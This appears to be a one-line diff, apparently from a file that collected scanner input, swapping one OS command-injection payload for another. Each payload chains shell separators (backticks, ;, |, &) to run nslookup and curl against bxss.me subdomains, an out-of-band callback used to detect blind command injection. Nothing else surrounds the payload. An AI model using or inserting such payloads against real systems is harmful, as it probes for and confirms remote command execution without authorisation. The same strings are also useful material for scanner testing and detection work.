@@ -1,1 +1,1 @@
-`(nslookup -q=cname hitikssefrbeka0601.bxss.me||curl hitikssefrbeka0601.bxss.me)`
+;(nslookup -q=cname hitomfwtruiik4e61d.bxss.me||curl hitomfwtruiik4e61d.bxss.me)|(nslookup -q=cname hitomfwtruiik4e61d.bxss.me||curl hitomfwtruiik4e61d.bxss.me)&(nslookup -q=cname hitomfwtruiik4e61d.bxss.me||curl hitomfwtruiik4e61d.bxss.me)
